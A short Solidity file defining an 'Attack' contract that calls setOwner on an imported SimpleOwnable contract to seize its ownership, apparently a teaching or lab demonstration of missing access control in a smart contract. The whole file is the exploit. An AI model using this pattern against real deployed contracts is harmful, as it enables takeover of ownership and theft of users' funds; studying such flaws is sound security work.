//SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./SimpleOwnable.sol";

contract Attack {
    SimpleOwnable public simpleOwnable;

    constructor(address _simpleOwnableAddress) {
        simpleOwnable = SimpleOwnable(_simpleOwnableAddress);
    }

    function attack() public {
        simpleOwnable.setOwner(address(this));
    }
}
